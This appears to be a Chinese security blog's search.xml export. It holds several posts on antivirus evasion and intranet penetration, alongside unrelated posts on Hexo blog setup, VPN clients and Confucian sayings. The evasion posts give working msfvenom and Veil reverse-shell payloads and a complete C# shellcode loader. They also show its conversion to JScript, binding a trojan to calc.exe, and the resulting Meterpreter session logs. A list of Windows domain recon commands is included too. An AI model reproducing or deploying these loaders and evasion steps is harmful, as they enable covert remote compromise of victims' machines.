Indetectable | TheFatRat : https://www.youtube.com/watch?v=26tSOuPcpZk Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :https://www.youtube.com/watch?v=1SQW9lujjT8 Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 https://www.youtube.com/watch?v=FlXMslSjnGw TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 ALL VIDEO IN HERE : https://www.youtube.com/results?search_query=thefatrat+backdoor]]></content>
      <categories>
        <category>bypass-av</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>bypass-av</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil-Evasion + pyJoiner 捆绑两个 EXE 的免杀木马]]></title>
    <url>%2F2018%2F03%2F09%2Fveil%2BpyJoiner.html</url>
    <content type="text"><![CDATA[0x00 前言最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。 0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马 Veil-Evasion 制作回连木马 12345678910111213141516root@kali:~# veiluse 1 #选择使用 Veil-Evasion 模块Veil-Evasion Menu 41 payloads loadedAvailable Commands: back Go to main Veil menu checkvt Check virustotal against generated hashes clean Remove generated artifacts exit Exit Veil info Information on a specific payload list List available payloads use Use a specific payloadVeil-Evasion command: use 11 #选择payload[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444[cs/meterpreter/rev_tcp&gt;&gt;] generate 使用以下命令开启监听： root@kali:~# msfconsole -r /var/lib/veil/output/handlers/test.rc 0x02 配置 pyJoiner—GUI-Version 运行环境GitHub 上有两个版本 项目地址 ，其中 kali 版必须使用 Kali Linux i386 ，我的是 x64 kali ，所以选择了 Windows版本的 pyJoiner—GUI-Version。 本次实验 pyJoiner 运行环境如下： Windows 10 Python 3.6.3 pyinstaller 3.3.1 0x03 将两个exe文件进行捆绑这里捆绑的是 calc.exe 这个程序，将回连木马 test.exe 与其进行捆绑，过程如下： py -3 pyJoiner.py #在 pyJoiner 目录下运行 CMD 执行命令，切记不要关闭CMD 打开 GUI 如下图： 实验中 file1 选择的 calc.exe ，file2 选择的回连木马test.exe， 选择好之后点击 Join 。 捆绑后生成的 exe 路径如下： 0x04 免杀回连测试使用在线查杀引擎 virustotal 的结果如下： 回连测试： 目标机 Windows 10 在目标机双击捆绑后的文件，打开了捆绑的 file1 应用程序计算器 kali 回连 Meteoreter session 12msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500 参考资料https://www.youtube.com/watch?v=vHz8QU2Dj9M https://github.com/danielhnmoreno/pyJoiner---GUI-Version]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装pptp和shadowsocks客户端]]></title>
    <url>%2F2018%2F03%2F06%2Fkali%E5%AE%89%E8%A3%85pptp%2Bshadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF.html</url>
    <content type="text"><![CDATA[kali 安装 pptp 方法依次执行以下命令 123456apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome#以上为一条命令来执行cp /etc/network/interfaces /etc/network/interfaces.backup echo &quot;auto lo &quot; &gt; /etc/network/interfaces echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces /etc/init.d/network-manager restart kali安装ss客户端Command-line Client1234pip install shadowsocksapt-get install shadowsocks-libevcpan Net::Shadowsockssslocal -s 23.154.235.12 -p 8388 -l 1080 -k password -t 600 -m aes-256-cfb 注释：-s 服务器IP，-p为ss配置的端口，-l 本地代理端口，-k为ss配置的密码]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>pptp</tag>
        <tag>ss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[免杀 MSF Windows Payload 的方法与实践（小白视角）]]></title>
    <url>%2F2017%2F12%2F22%2F%E5%85%8D%E6%9D%80%20MSF%20Windows%20Payload%20%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
    <content type="text"><![CDATA[MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。 0x00 制作payload使用 kali 里的 msfvenom 生成一个x86的 Meterpreter Payload 命令如下： 1root@kali:~# msfvenom -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.99 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe 大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。 生成结果 cat https.csharp 如图所示， 0x01 创建 c# 项目我们需要创建一个 C# 项目，我使用的是 Visual Studio 2017。新建一个空白的 C# 的控制台应用(.NET Framework)工程，.Net Framework 版本选择 2.0（保证兼容性）。 将下列代码粘贴覆盖到 Program.cs 中： 123456789101112131415161718192021222324252627282930using System;using System.Threading;using System.Runtime.InteropServices;namespace MSFWrapper&#123; public class Program &#123; public Program() &#123; RunMSF(); &#125; public static void RunMSF() &#123; byte[] MsfPayload = &#123; //Paste your Payload here &#125;; IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40); Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length); CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0); Thread.Sleep(2000); &#125; public static void Main() &#123; &#125; [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); &#125;&#125; 然后将在 kali 生成的 payload 中的十六进制数数组粘贴到代码中注释为“//Paste your Payload here”的下面。 保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存，如图： 增加 Release 版的 x86 编译对象，如图： 然后生成出 MSFWrapper.exe ： 0x02 将生成的 exe 文件转换成 js 文件DotNetToJScript源码下载 开源工具DotNetToJScript详细编译教程 转换命令： F:\WEB渗透工具&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe 0x03 通过命令执行 js 文件使其弹回 Meterpreter shell在 kali 里执行命令进行监听： 123456root@kali:~# msfconsole msf &gt; use exploit/multi/handler msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httpsmsf exploit(multi/handler) &gt; set lhost 192.168.1.99msf exploit(multi/handler) &gt; set lport 443msf exploit(multi/handler) &gt; run 在目标机器执行如下命令： C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js kali 反弹回 meterpreter ： 12[*] Started HTTPS reverse handler on https://192.168.1.99:443[*] https://192.168.1.99:443 handling request from 192.168.1.84; (UUID: flnzcixx) Staging x86 payload (180825 bytes) ... 这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！ 0x04 END未完待续 ing……]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源工具DotNetToJScript详细编译教程]]></title>
    <url>%2F2017%2F12%2F18%2F%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%20DotNetToJScript.html</url>
    <content type="text"><![CDATA[0x00 介绍James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。 工具下载：下载地址 0x01 用到工具由于此为开源代码需要自己编译，通过自己的研究终于编译成功。 使用工具vs2017； ndesk-options-0.2.1.bin 文件的引用。 0x02 编译过程 打开vs2017，点击打开项目/解决方案； 打开DotNetToJScript目录下的DotNetToJScript.csproj Visual C# 项目文件； 点击Program.cs生成解决方案； 报错缺少程序集引用 NDesk.Options； 解决办法 需要添加引用 NDesk.Options 下载地址： 点击下载 解压缩，按图添加引用； ​ 浏览—-选择图中文件—-添加； 然后重新生成解决方案即可； ​ ​ ​]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo + Next 搭建GitHub page]]></title>
    <url>%2F2017%2F12%2F13%2FHexo%2Bnext.html</url>
    <content type="text"><![CDATA[0x00 准备工作 下载node.js并安装 官网下载安装默认会安装npm； 下载安装git 官网下载安装； 安装hexo，方法：管理员打开cmd：$ npm install -g hexo-cli。 0x01 本地生成hexo文件 在本地新建一个文件夹 e.g. D:/Hexo ； 在D:/Hexo目录下鼠标右键”Git Bash Here”，输入：hexo init; 输入：hexo g 生成静态网页，hexo s 启动本地服务预览； 完成后Hexo文件夹会生成以下内容： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 打开本地浏览器 输入：http://localhost:4000 进行访问。 0x02 将本地hexo推送到GitHub 在GitHub上创建名字为 zhangsan.github.io 的项目zhangsan是自己的github用户名； 打开 D:/Hexo/_config.yml 配置文件，修改以下内容为 http://zhangsan.github.io ： 123# URL## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: http://zhangsan.github.io 打开 D:/Hexo/_config配置文件，在文末的deploy做以下设置： 1234deploy: type: git repository: https://github.com/zhangsan/zhangsan.github.io.git branch: master 执行：npm install hexo-deployer-git –save （此命令最好在管理员权限的cmd下执行）； 执行：hexo clear (一般情况下不用执行这个命令，当网站错误打不开的时候再执行它！)； 执行：hexo g （本地生成静态文件）； 执行：hexo d （将本地静态文件推送至Github)； 期间会弹出github登录框按提示登录即可，登录成功一次往后不用重复登录； 通过http://zhangsan.github.io即可访问。 0x03 绑定自己的域名 域名服务商-控制面板-DNS解析—添加CNAME记录：@ &gt;&gt;&gt; zhangsan.github.ioORwww &gt;&gt;&gt; zhangsan.github.io 在Hexo/sorce新建CNAME文件写入域名，CNAME文件，注意没有文件后缀； 执行：hexo g 执行：hexo s（本地预览，可以跳过） 执行：hexo d 0x04 使用next主题并给网站添加浏览器logo 主题下载，next在github下载，并把next文件夹放到temes文件夹； 使用next主题，编辑Hexo/_config.yml以下内容：##Themes: https://hexo.io/themes/theme: next 将尺寸为32x32 favicon.ico 文件放在hexo/source/文件夹内，然后修改Hexo\themes\next\_config.yml为： 12# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico 编辑Hexo/_config.yml以下内容： 12# Place your favicon.ico to /source directory.favicon: /favicon.ico 0x05 将网站显示为中文 编辑D:/Hexo/_config.yml配置文件： 12language: zh-Hans #将默认改成zh-Hanstimezone: 在Hexo/next/lanhuages目录下的zh-Hans.yml文件可以自行修改，增加和删除。 0x06 添加菜单和自定义菜单前的图标 编辑themes\next\_config.yml，到menu:字段，在该字段下添加一个字段； 1234menu: home: / about: /about ...... 自定义小图标，关于next使用的小图标你可以通过这个网站Font Awesome来查看自己喜欢的图标，然后copy图标名，编辑Hexo\themes\next\_config.yml，将对应的图标名换成自己喜欢的小图标； 1234567891011menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: mortar-board categories: smile-o schedule: calendar tags: diamond archives: angellist sitemap: sitemap commonweal: heartbeat 0x07 隐藏网页底部powered By Hexo / 强力驱动 打开themes/next/layout/_partials/footer.swig,使用””隐藏之间的代码即可，或者直接删除。12345678910&lt;!--&lt;div class=&quot;powered-by&quot;&gt; &#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;&lt;/div&gt;&lt;div class=&quot;theme-info&quot;&gt; &#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; - &lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt; NexT.&#123;&#123; theme.scheme &#125;&#125; &lt;/a&gt;&lt;/div&gt; 0x08 增加本地搜索功能安装 hexo-generator-searchdb，在站点的根目录下执行以下命令：$ npm install hexo-generator-searchdb --save如果报错多执行几次，有的时候是网络原因，最好在管理员权限下的cmd里执行npm安装命令。编辑Hexo/_config.yml，新增以下内容：12345search: path: search.xml field: post format: html limit: 10000 0x09 使用来必力评论功能 到livere注册账号，安装来必力，记录以下内容： 在next/_config.yml的此处加上自己的livere的uid：livere_uid: your uid 然后去博客查看吧文章下面会看到以下景象： 0x10 参考文章(https://thief.one/2017/03/03/Hexo搭建博客教程/)]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 内网命令收集]]></title>
    <url>%2F2017%2F12%2F09%2FWindows%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4.html</url>
    <content type="text"><![CDATA[Windows 内网命令常见信息收集命令 123456789101112net user 本机用户列表 net localgroup administrators 本机管理员[通常含有域用户] net user /domain 查询域用户 net group /domain 查询域里面的工作组 net group &quot;domain admins&quot; /domain 查询域管理员用户组 net localgroup administrators /domain 登录本机的域管理员 net localgroup administrators workgroup\user001 /add 域用户添加到本机 net group &quot;Domain controllers&quot; 查看域控制器(如果有多台) ipconfig /all 查询本机IP段，所在域等 net view 查询同一域内机器列表 net view /domain 查询域列表 net view /domain:domainname 查看workgroup域中计算机列表 内网(域)渗透–基本命令123456789101112131415161718192021222324ipconfig /all 查询本机IP段，所在域等 net user 本机用户列表 net localgroup administrators 本机管理员[通常含有域用户] net user /domain 查询域用户 net group /domain 查询域里面的工作组 net group &quot;domain admins&quot; /domain 查询域管理员用户组 net localgroup administrators /domain 登录本机的域管理员 net localgroup administrators workgroup\user001 /add 域用户添加到本机 net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台) net time /domain 判断主域，主域服务器都做时间服务器 net config workstation 当前登录域 net session 查看当前会话 net use \\ip\ipc$ pawword /user:username 建立IPC会话[空连接­***] net share 查看SMB指向的路径[即共享] net view 查询同一域内机器列表 net view \\ip 查询某IP共享 net view /domain 查询域列表 net view /domain:domainname 查看workgroup域中计算机列表 net start 查看当前运行的服务 net accounts 查看本地密码策略 net accounts /domain 查看域密码策略nbtstat –A ip netbios 查询 netstat –an/ano/anb 网络连接查询 route print 路由表 End]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[论语十则]]></title>
    <url>%2F2017%2F12%2F07%2Findex.html</url>
    <content type="text"><![CDATA[《论语·十则》子曰：“学而时习之，不亦说乎？有朋自远方来，不亦乐乎？人不知而不愠，不亦君子乎？”曾子曰：“吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎？” 子曰：“温故而知新，可以为师矣。” 子曰：“学而不思则罔，思而不学则殆。” 子曰：“由，诲女知之乎！知之为知之，不知为不知，是知也。” 子曰：“见贤思齐焉，见不贤而内自省也。” 子曰：“三人行，必有我师焉。择其善者而从之，其不善者而改之。” 曾子曰：“士不可以不弘毅，任重而道远。仁以为己任，不亦重乎？死而后已，不亦远乎？”子曰：“岁寒，然后知松柏之后凋也。” 1子贡问曰：“有一言而可以终身行之者乎？”子曰：“其恕乎！己所不欲，勿施于人。”]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>省身</tag>
      </tags>
  </entry>
</search>
